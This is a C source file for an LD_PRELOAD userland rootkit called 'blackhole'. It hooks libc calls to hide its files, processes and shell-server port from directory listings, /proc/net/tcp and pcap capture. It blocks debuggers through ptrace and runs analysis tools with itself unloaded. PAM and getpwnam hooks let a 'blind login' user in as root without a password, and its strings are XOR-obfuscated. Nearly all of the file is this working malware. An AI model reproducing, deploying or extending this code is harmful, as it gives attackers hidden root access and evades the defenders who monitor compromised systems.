#define _GNU_SOURCE // Activates all GNU C Library extensions

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <errno.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/wait.h>
#include <utmp.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <pty.h>
#include <pcap/pcap.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <pwd.h>
#include <openssl/evp.h>

#include "etc.h"
#include "libshserver.h"

char *blackhole = "If you feel you are in a black hole, don’t give up. There’s a way out.";

// Set up syscall hooks
void init(void) {
    if (is_loaded) {
        return;
    }

    for (int i = 0; i < SYSCALL_SIZE; ++i) {
        char *scallname = strdup(syscall_table[i]); // duplicates the syscall name

        xor(scallname); // decode

        strncpy(syscall_list[i].syscall_name, scallname, 50); // copy the name to the structure
        syscall_list[i].syscall_name[50] = '\0'; // null-terminated

        syscall_list[i].syscall_func = dlsym(RTLD_NEXT, scallname); // gets the pointer to the original syscall function

        if (!syscall_list[i].syscall_func) {
            DEBUG("[blackhole]: Error loading syscall %s\n", dlerror());
        }

        cleanup(scallname, strlen(scallname)); // clears allocated memory
    }

    is_loaded = 1;
}

int is_owner(void) {
    if (owner) {
        return owner;
    }

    char *hide_term_str = strdup(HIDE_TERM_STR);

    xor(hide_term_str);

    char *hide_term_var = getenv(hide_term_str);

    if (hide_term_var != NULL) {
        owner = 1;
    } else {
        owner = 0;
    }

    cleanup(hide_term_str, strlen(hide_term_str));

    return owner;
}

int is_procnet(const char *filename) {
    if (is_owner()) {
        return 0;
    }

    char *proc_net_tcp = strdup(PROC_NET_TCP);
    char *proc_net_tcp6 = strdup(PROC_NET_TCP6);

    xor(proc_net_tcp);
    xor(proc_net_tcp6);

    if ((strcmp(filename, proc_net_tcp) == 0) || (strcmp(filename, proc_net_tcp6) == 0)) {
        cleanup(proc_net_tcp, strlen(proc_net_tcp));
        cleanup(proc_net_tcp6, strlen(proc_net_tcp6));
        return 1;
    }

    cleanup(proc_net_tcp, strlen(proc_net_tcp));
    cleanup(proc_net_tcp6, strlen(proc_net_tcp6));

    return 0;
}

int is_invisible(const char *path) {
    init(); // hook configurations

    if (is_owner()) {
        return 0;
    }

    char *config_file = strdup(CONFIG_FILE);
    char *bin_file = strdup(BIN_FILE);
    char *shell_server = strdup(SHELL_SERVER);

    xor(config_file);
    xor(bin_file);
    xor(shell_server);

    // Checks if the path contains the MAGIC_STRING
    if ((strstr(path, MAGIC_STRING)) ||
        (strstr(path, shell_server)) ||
        (strstr(path, config_file)) ||
        (strstr(path, bin_file))) {
        cleanup(config_file, strlen(config_file));
        cleanup(bin_file, strlen(bin_file));
        cleanup(shell_server, strlen(shell_server));
        return 1; // invisible
    }

    char line[MAX_LEN];
    char p_path[PATH_MAX];
    char *proc_path = strdup(PROC_PATH);
    FILE *cmd;

    xor(proc_path);

    if (strstr(path, proc_path)) {
        cleanup(proc_path, strlen(proc_path));

        char *cmd_proc_name = strdup(CMD_PROC_NAME);

        xor(cmd_proc_name);

        snprintf(p_path, PATH_MAX, cmd_proc_name, extract_pid(path));

        cleanup(cmd_proc_name, strlen(cmd_proc_name));

        cmd = syscall_list[SYS_FOPEN].syscall_func(p_path, "r");

        if (cmd) {
            int res;

            while ((res=fgets(line, MAX_LEN, cmd) != NULL)) {
                if (strstr(line, shell_server)) {
                    cleanup(config_file, strlen(config_file));
                    cleanup(bin_file, strlen(bin_file));
                    cleanup(shell_server, strlen(shell_server));
                    return 1; // invisible
                }

                memset(line, 0x00, MAX_LEN);
					  }

            fclose(cmd);
        }
    } else {
        cleanup(proc_path, strlen(proc_path));
    }

    cleanup(shell_server, strlen(shell_server));
    cleanup(config_file, strlen(config_file));
    cleanup(bin_file, strlen(bin_file));

    return 0; // visible
}

void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    const struct sniff_ip *ip;
    const struct sniff_tcp *tcp;

    int size_ip;
    int size_tcp;
    int sport,dport;

    // IP header offset
    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip) * 4;
    if (size_ip < 20) {
        return; // invalid IP header length
    }

    switch (ip->ip_p) {
        case IPPROTO_TCP:
            // noop
            break;
        default:
            if (old_pcap_callback) {
                old_pcap_callback(args, header, packet);
            }

            return;
    }

    // TCP header offset
    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp) * 4;
    if (size_tcp < 20) {
        return; // invalid TCP header length
    }

    sport = htons(tcp->th_sport);
    dport = htons(tcp->th_dport);

    if ((sport == SHELL_SERVER_PORT) || (dport == SHELL_SERVER_PORT)) {
        return; // hide traffic
    } else {
        if (old_pcap_callback) {
            old_pcap_callback(args, header, packet);
        }
    }

    return;
}

FILE *hide_ports(const char *filename) {
    char line[LINE_MAX];
    char *proc_net_tcp = strdup(PROC_NET_TCP);
    char *proc_net_tcp6 = strdup(PROC_NET_TCP6);

    xor(proc_net_tcp);
    xor(proc_net_tcp6);

    unsigned long rxq, txq, time_len, retr, inode;
    int local_port, rem_port, d, state, uid, timer_run, timeout;
    char rem_addr[128], local_addr[128], more[512];

    init(); // hook configurations

    FILE *tmp = tmpfile();
    FILE *pnt = syscall_list[SYS_FOPEN].syscall_func(filename, "r");

    while (fgets(line, LINE_MAX, pnt) != NULL) {
        char *scanf_line = strdup(SCANF_LINE);

        xor(scanf_line);

        sscanf(line, scanf_line, &d, local_addr, &local_port, rem_addr, &rem_port, &state, &txq, &rxq, &timer_run, &time_len, &retr, &uid, &timeout, &inode, more);

        cleanup(scanf_line, strlen(scanf_line));

        if ((rem_port == SHELL_SERVER_PORT) || (local_port == SHELL_SERVER_PORT)) {
            continue; // hide port
        } else {
            fputs(line, tmp);
        }
    }

    cleanup(proc_net_tcp, strlen(proc_net_tcp));
    cleanup(proc_net_tcp6, strlen(proc_net_tcp6));

    fclose(pnt);
    fseek(tmp, 0, SEEK_SET);

    return tmp;
}

// Hooked execve function to create a temporary “sandbox process” to execute binaries without the rootkit loaded
int execve(const char *path, char *const argv[], char *const envp[]) {
    DEBUG("[blackhole]: execve hooked %s\n", path);

    init(); // hook configurations

    if (is_owner()) {
        return (long) syscall_list[SYS_EXECVE].syscall_func(path, argv, envp);
    }

    unsigned char hash[EVP_MAX_MD_SIZE];
    unsigned int hash_length;
    calculate_sha256(path, hash, &hash_length);
    char hash_string[65];
    hash_to_string(hash, hash_length, hash_string);

    char *hashdb_binblock_path = strdup(HASHDB_BINBLOCK_PATH);

    xor(hashdb_binblock_path);

    FILE *binblock_file = syscall_list[SYS_FOPEN].syscall_func(hashdb_binblock_path, "r");
    if (!binblock_file) {
        DEBUG("[blackhole]: Error opening hash database %s\n", hashdb_binblock_path);
        cleanup(hashdb_binblock_path, strlen(hashdb_binblock_path));
    } else {
        cleanup(hashdb_binblock_path, strlen(hashdb_binblock_path));

        int is_binblock = is_hash_in_db(hash_string, binblock_file);
        fclose(binblock_file);

        if (is_binblock) {
            char *binblock_msg = strdup(BINBLOCK_MSG);
            xor(binblock_msg);
            printf("%s\n", binblock_msg);
            cleanup(binblock_msg, strlen(binblock_msg));
            exit(-1);
        }
    }

    char *hashdb_binavoid_path = strdup(HASHDB_BINAVOID_PATH);
    char *ld_trace = strdup(LD_TRACE);

    xor(ld_trace);
    xor(hashdb_binavoid_path);

    char *trace_var = getenv(ld_trace);

    cleanup(ld_trace, strlen(ld_trace));

    int pid, ret;

    FILE *hashdb_binavoid_file = syscall_list[SYS_FOPEN].syscall_func(hashdb_binavoid_path, "r");
    if (!hashdb_binavoid_file) {
        DEBUG("[blackhole]: Error opening hash database %s\n", hashdb_binavoid_path);
        cleanup(hashdb_binavoid_path, strlen(hashdb_binavoid_path));
        return (long) syscall_list[SYS_EXECVE].syscall_func(path, argv, envp);
    }

    cleanup(hashdb_binavoid_path, strlen(hashdb_binavoid_path));

    int is_hide = is_hash_in_db(hash_string, hashdb_binavoid_file);
    fclose(hashdb_binavoid_file);

    // If the path corresponds to certain debugging or analysis tools
    if (is_hide || trace_var != NULL) {
        char *ld_normal = strdup(LD_NORMAL);
        char *ld_hide = strdup(LD_HIDE);

        xor(ld_normal);
        xor(ld_hide);

        // This leaves the hidden files exposed during the execution of the child process
        syscall_list[SYS_RENAME].syscall_func(ld_normal, ld_hide); // rename the ld file to hide it

        // Create a new process
        if ((pid = fork()) == -1) {
            cleanup(ld_normal, strlen(ld_normal));
            cleanup(ld_hide, strlen(ld_hide));
            return -1;
        } else if (pid == 0) {
            cleanup(ld_normal, strlen(ld_normal));
            cleanup(ld_hide, strlen(ld_hide));

            // The child process runs the program without the rootkit ld loaded
            return (long) syscall_list[SYS_EXECVE].syscall_func(path, argv, NULL);
        } else {
            wait(&ret); // the main process is waiting for the child process to finish
        }

        // Restore the ld
        syscall_list[SYS_RENAME].syscall_func(ld_hide, ld_normal);

        cleanup(ld_normal, strlen(ld_normal));
        cleanup(ld_hide, strlen(ld_hide));
    } else {
        // Calls the original execve function if it's not debugging
        ret = (long) syscall_list[SYS_EXECVE].syscall_func(path, argv, envp);
    }

    exit(ret); // exit with the return value of the original execve function
}

// Hooked ptrace function to exit on debug
long ptrace(void *request, pid_t pid, void *addr, void *data) {
    char *anti_debug_msg = strdup(ANTI_DEBUG_MSG);
    xor(anti_debug_msg);
    printf("%s\n", anti_debug_msg);
    cleanup(anti_debug_msg, strlen(anti_debug_msg));
    exit(-1);
}

// Hooked access function to hide invisible files
int access(const char *path, int mode) {
    DEBUG("[blackhole]: access hooked\n");

    if (is_invisible(path)) {
        errno = ENOENT;
        return -1;
    }

    // Calls the original access function if the path is visible
    return (long) syscall_list[SYS_ACCESS].syscall_func(path, mode);
}

// Hooked readdir function to hide invisible directory entries
struct dirent *readdir(DIR *dirp) {
    DEBUG("[blackhole]: readdir hooked\n");

    struct dirent *dir;

    do {
        dir = syscall_list[SYS_READDIR].syscall_func(dirp);

        // Checks if the entry is not NULL and if it is “.” or “..”
        if (dir != NULL && (strcmp(dir->d_name,".") == 0 || strcmp(dir->d_name,"..") == 0)) {
            continue;
        }
    } while (dir && is_invisible(dir->d_name));

    return dir;
}

// Hooked fopen function to hide invisible files
FILE *fopen(const char *filename, const char *mode) {
    DEBUG("[blackhole]: fopen hooked %s\n", filename);

    if (is_procnet(filename)) {
        return hide_ports(filename);
    }

    if (is_invisible(filename)) {
        errno = ENOENT;
        return NULL;
    }

    // Calls the original fopen function if the file is visible
    return syscall_list[SYS_FOPEN].syscall_func(filename, mode);
}

// Hooked opendir function to hide invisible directories
DIR *opendir(const char *pathname) {
    DEBUG("[blackhole]: opendir hooked\n");

    if (is_invisible(pathname)) {
        errno = ENOENT;
        return NULL;
    }

    // Calls the original opendir function if the path is visible
    return syscall_list[SYS_OPENDIR].syscall_func(pathname);
}

// Hooked open function to hide invisible files
int open(const char *pathname, int flags, mode_t mode) {
    DEBUG("[blackhole]: open hooked %s\n", pathname);

    if (is_invisible(pathname)) {
        errno = ENOENT;
        return -1;
    }

    // Calls the original open function if the path is visible
    return (long) syscall_list[SYS_OPEN].syscall_func(pathname, flags, mode);
}

// Hooked rmdir function to hide invisible directories
int rmdir(const char *pathname) {
    DEBUG("[blackhole]: rmdir hooked\n");

    if (is_invisible(pathname)) {
        errno = ENOENT;
        return -1;
    }

    // Calls the original rmdir function if the path is visible
    return (long) syscall_list[SYS_RMDIR].syscall_func(pathname);
}

// Hooked link function to hide invisible files
int link(const char *oldpath, const char *newpath) {
    DEBUG("[blackhole]: link hooked\n");

    if (is_invisible(oldpath)) {
        errno = ENOENT;
        return -1;
    }

    // Calls the original link function if the path is visible
    return (long) syscall_list[SYS_LINK].syscall_func(oldpath, newpath);
}

// Hooked unlink function to hide invisible files
int unlink(const char *pathname) {
    DEBUG("[blackhole]: unlink hooked\n");

    if (is_invisible(pathname)) {
        errno = ENOENT;
        return -1;
    }

    // Calls the original unlink function if the path is visible
    return (long) syscall_list[SYS_UNLINK].syscall_func(pathname);
}

// Hooked unlinkat function to hide invisible files
int unlinkat(int dirfd, const char *pathname, int flags) {
    DEBUG("[blackhole]: unlinkat hooked\n");

    if (is_invisible(pathname)) {
        errno = ENOENT;
        return -1;
    }

    // Calls the original unlinkat function if the path is visible
    return (long) syscall_list[SYS_UNLINKAT].syscall_func(dirfd, pathname, flags);
}

// Hooked rename function to hide invisible files
int rename(const char *oldpath, const char *newpath) {
    DEBUG("[blackhole]: rename hooked\n");

    if (is_invisible(oldpath)) {
        errno = ENOENT;
        return -1;
    }

    // Calls the original rename function if the oldpath is visible
    return (long) syscall_list[SYS_RENAME].syscall_func(oldpath, newpath);
}

// Hooked mkdir function to hide invisible directories
int mkdir(const char *pathname, mode_t mode) {
    DEBUG("[blackhole]: mkdir hooked\n");

    if (is_invisible(pathname)) {
        errno = EACCES;
        return -1;
    }

    // Calls the original mkdir function if the path is visible
    return (long) syscall_list[SYS_MKDIR].syscall_func(pathname, mode);
}

// Hooked mkdirat function to hide invisible directories
int mkdirat(int dirfd, const char *pathname, mode_t mode) {
    DEBUG("[blackhole]: mkdirat hooked\n");

    if (is_invisible(pathname)) {
        errno = EACCES;
        return -1;
    }

    // Calls the original mkdirat function if the path is visible
    return (long) syscall_list[SYS_MKDIRAT].syscall_func(dirfd, pathname, mode);
}

// Hooked pcap_loop function to avoids local sniffing
int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user) {
    DEBUG("[blackhole]: pcap_loop hooked\n");

    init(); // hook configurations

    old_pcap_callback = callback;

    return (long) syscall_list[SYS_PCAP_LOOP].syscall_func(p, cnt, packet_handler, user);
}

// Hooked pam_authenticate function to bypass login
int pam_authenticate(pam_handle_t *pamh, int flags) {
    DEBUG("[blackhole]: pam_authenticate called\n");

    init(); // hook configurations

    void *user;
    char *blind_login = strdup(BLIND_LOGIN);

    xor(blind_login);

    pam_get_item(pamh, PAM_USER, (const void **)&user);

    if (strstr(user, blind_login)) {
        cleanup(blind_login, strlen(blind_login));
        return PAM_SUCCESS;
    }

    cleanup(blind_login, strlen(blind_login));

    // Calls the original pam_authenticate function if it's not a blind login
    return (long) syscall_list[SYS_PAM_AUTHENTICATE].syscall_func(pamh, flags);
}

// Hooked pam_open_session function to bypass login
int pam_open_session(pam_handle_t *pamh, int flags) {
    DEBUG("[blackhole]: pam_open_session called\n");

    init(); // hook configurations

    void *user;
    char *blind_login = strdup(BLIND_LOGIN);

    xor(blind_login);

    pam_get_item(pamh, PAM_USER, (const void **)&user);

    if (strstr(user, blind_login)) {
        cleanup(blind_login, strlen(blind_login));
        return PAM_SUCCESS;
    }

    cleanup(blind_login, strlen(blind_login));

    // Calls the original pam_open_session function if it's not a blind login
    return (long) syscall_list[SYS_PAM_OPEN_SESSION].syscall_func(pamh, flags);
}

// Hooked getpwnam function to bypass login
struct passwd *getpwnam(const char *name) {
    DEBUG("[blackhole]: getpwnam called %s\n", name);

    init(); // hook configurations

    struct passwd *mypw;
    char *blind_login = strdup(BLIND_LOGIN);
    char *c_root = strdup(C_ROOT);

    xor(blind_login);
    xor(c_root);

    if (strstr(name, blind_login)) {
        mypw = syscall_list[SYS_GETPWNAM].syscall_func(c_root);
        mypw->pw_name = strdup(c_root);

        cleanup(blind_login, strlen(blind_login));
        cleanup(c_root, strlen(c_root));

        return mypw;
    }

    cleanup(blind_login, strlen(blind_login));
    cleanup(c_root, strlen(c_root));

    // Calls the original getpwnam function if it's not a blind login
    return syscall_list[SYS_GETPWNAM].syscall_func(name);
}

// Hooked getpwnam_r function to bypass login
int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result) {
    DEBUG("[blackhole]: getpwnam_r called\n");

    init(); // hook configurations

    char *blind_login = strdup(BLIND_LOGIN);
    char *c_root = strdup(C_ROOT);
    char user[51];

    xor(blind_login);
    xor(c_root);

    if (strstr(name, blind_login)) {
        strncpy(user, c_root, sizeof(user)-1);

        cleanup(blind_login, strlen(blind_login));
        cleanup(c_root, strlen(c_root));

        return (long) syscall_list[SYS_GETPWNAM_R].syscall_func(user, pwd, buf, buflen, result);
    }

    cleanup(blind_login, strlen(blind_login));
    cleanup(c_root, strlen(c_root));

    // Calls the original getpwnam_r function if it's not a blind login
    return (long) syscall_list[SYS_GETPWNAM_R].syscall_func(name, pwd, buf, buflen, result);
}

// Hooked pam_acct_mgmt function to bypass login
int pam_acct_mgmt(pam_handle_t *pamh, int flags) {
    DEBUG("[blackhole]: pam_acct_mgmt called\n");

    init(); // hook configurations

    void *user;
    char *blind_login = strdup(BLIND_LOGIN);

    xor(blind_login);

    pam_get_item(pamh, PAM_USER, (const void **)&user);

    if (strstr(user, blind_login)) {
        cleanup(blind_login, strlen(blind_login));
        return PAM_SUCCESS;
    }

    cleanup(blind_login, strlen(blind_login));

    // Calls the original pam_acct_mgmt function if it's not a blind login
    return (long) syscall_list[SYS_PAM_ACCT_MGMT].syscall_func(pamh, flags);
}

